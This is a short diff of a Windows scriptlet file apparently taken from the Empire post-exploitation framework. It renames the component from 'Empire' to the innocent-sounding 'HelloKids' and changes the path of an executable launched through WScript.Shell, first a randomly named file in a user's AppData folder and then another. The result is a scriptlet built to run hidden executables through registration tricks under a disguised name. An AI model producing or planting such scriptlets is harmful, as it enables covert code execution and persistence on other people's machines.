@@ -2,8 +2,8 @@
 <scriptlet>	
 
 <registration	
-    description="Empire"	
-    progid="Empire"	
+    description="HelloKids"	
+    progid="HelloKids"	
     version="1.00"	
     classid="{20001111-0000-0000-0000-0000FEEDACDC}"	
 	>	
@@ -14,7 +14,7 @@
 	<script language="JScript">	
 		<![CDATA[	
 
-			var r = new ActiveXObject("WScript.Shell").Run("C:\\Users\\Vera\\AppData\\Roaming\\Sysdisk\\ghbdtnb.exe");		
+			var r = new ActiveXObject("WScript.Shell").Run("C:\\Program Files\\Cosmopolitanize\\Diggins.exe");		
 
 		]]>	
 </script>	
